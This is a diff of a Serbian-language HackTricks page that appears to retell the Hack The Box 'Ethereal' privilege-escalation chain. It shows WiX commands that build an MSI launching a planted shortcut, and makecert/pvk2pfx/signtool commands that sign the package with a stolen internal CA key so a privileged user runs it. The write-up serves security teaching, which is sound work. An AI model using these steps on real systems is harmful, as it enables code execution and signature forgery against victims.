@@ -1,12 +1,12 @@
-# Kreiranje Malicioznog MSI-ja i Dobijanje Root-a
+# Kreiranje Custom-Action MSI-ja pomoću WiX-a
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Kreiranje MSI instalera biće obavljeno pomoću wixtools-a, tačnije koristiće se [wixtools](http://wixtoolset.org). Vredi napomenuti da su isprobani alternativni MSI builderi, ali u ovom konkretnom slučaju nisu bili uspešni.<sup>[[1]](#references)</sup>
+Ovaj istorijski lanac sa Hack The Box-a koristio je WiX Toolset v3 za izgradnju MSI-ja koji je pokretao prethodno postavljeni `.lnk` fajl. **MSI nije automatski privilegovan**: izvršavanje se odvija u kontekstu koji određuju Windows Installer politika, atributi custom action-a i korisnik koji ga instalira. U navedenom scenariju, napadač je takođe ukrao pouzdani signing CA i postavio potpisani MSI u folder koji je nadgledao drugi korisnik.<sup>[[1]](#references)[[3]](#references)</sup>
 
-Za sveobuhvatno razumevanje primera korišćenja wix MSI-ja, preporučljivo je pogledati [ovu stranicu](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Ovde možete pronaći različite primere koji demonstriraju korišćenje wix MSI-ja.<sup>[[2]](#references)</sup>
+Za sveobuhvatno razumevanje primera upotrebe wix MSI-ja, preporučuje se da pogledate [ovu stranicu](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Ovde možete pronaći različite primere koji prikazuju upotrebu wix MSI-ja.<sup>[[2]](#references)</sup>
 
-Cilj je generisati MSI koji će izvršiti lnk fajl. Da bi se to postiglo, mogao bi se koristiti sledeći XML kod ([xml sa ove stranice](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
+MSI pokreće `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. Originalni WiX v3 XML je sačuvan u nastavku:<sup>[[1]](#references)</sup>
 ```html
 <?xml version="1.0"?>
 <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
@@ -38,25 +38,31 @@ fail_here
 </Product>
 </Wix>
 ```
-Važno je napomenuti da element Package sadrži atribute kao što su InstallerVersion i Compressed, koji određuju verziju instalera i označavaju da li je paket kompresovan ili ne.
+`InstallerVersion` definiše minimalnu verziju Windows Installer-a, a `Compressed="yes"` označava da je paket kompresovan. `Stage1` je deferred, ali ima `Impersonate="yes"`, pa se izvršava sa impersoniranim tokenom korisnika koji vrši instalaciju; do promene privilegija u ovom scenariju došlo je zato što je privilegovani korisnik kasnije otvorio MSI, a ne zato što taj atribut magično dodeljuje SYSTEM privilegije.<sup>[[3]](#references)</sup>
 
-Proces kreiranja uključuje korišćenje alata candle.exe iz wixtools-a za generisanje wixobject-a iz msi.xml. Treba izvršiti sledeću komandu:<sup>[[1]](#references)</sup>
+Kompajlirajte izvorni kod u WiX objekat pomoću programa `candle.exe`:<sup>[[1]](#references)</sup>
 ```
-candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
+candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
 ```
-Pored toga, vredi napomenuti da je u objavi obezbeđena slika koja prikazuje komandu i njen izlaz. Možete je koristiti kao vizuelni prikaz.<sup>[[1]](#references)</sup>
-
-Takođe, light.exe, još jedan alat iz wixtools, koristiće se za kreiranje MSI datoteke iz wixobject-a. Komanda koju treba izvršiti je sledeća:<sup>[[1]](#references)</sup>
+Povežite taj objekat u MSI pomoću `light.exe`:<sup>[[1]](#references)</sup>
 ```
-light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
+light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
 ```
-Slično prethodnoj komandi, u objavi je uključena slika koja prikazuje komandu i njen izlaz.<sup>[[1]](#references)</sup>
+### Korak potpisivanja korišćen u originalnom lancu
 
-Imajte na umu da, iako ovaj sažetak ima za cilj da pruži korisne informacije, preporučuje se da pogledate originalnu objavu radi detaljnijih informacija i preciznih uputstava.<sup>[[1]](#references)</sup>
+Ciljni tok rada prihvatao je pakete potpisane kompromitovanim internim CA. Dokumentacija je izvela sertifikat za potpisivanje iz oporavljenih `MyCA.cer`/`MyCA.pvk`, kreirala PFX i potpisala MSI:<sup>[[1]](#references)</sup>
+```powershell
+makecert.exe -n "CN=Ethereal" -pe -cy end `
+-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
+-sv C:\tmp\rick.pvk C:\tmp\rick.cer
+pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
+signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
+```
+Napadač je zatim postavio potpisani paket u `D:\DEV\MSIs` i sačekao da ga privilegovani workflow/korisnik izvrši. Očuvajte taj preduslov prilikom prilagođavanja tehnike: bez povišenog installation path-a, nesigurne policy kao što je `AlwaysInstallElevated` ili privilegovanog žrtvinog procesa, ovaj paket se izvršava samo sa pravima trenutnog korisnika.
 
-## Reference
+## References
 
-- [1] [Hack The Box - Ethereal: Kreiranje zlonamernog msi paketa i dobijanje root pristupa - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
-- [2] [Kratak uvod: Kreiranje MSI instalera pomoću WiX-a - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (pogledajte i [wixtools](http://wixtoolset.org))
-
+- [1] [Hack The Box - Ethereal: Kreiranje zlonamernog msi-ja i dobijanje root-a - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
+- [2] [Kratak uvod: Kreiranje MSI installer-a pomoću WiX-a - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
+- [3] [Microsoft Learn — Custom actions sa odloženim izvršavanjem (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
 {{#include ../../banners/hacktricks-training.md}}
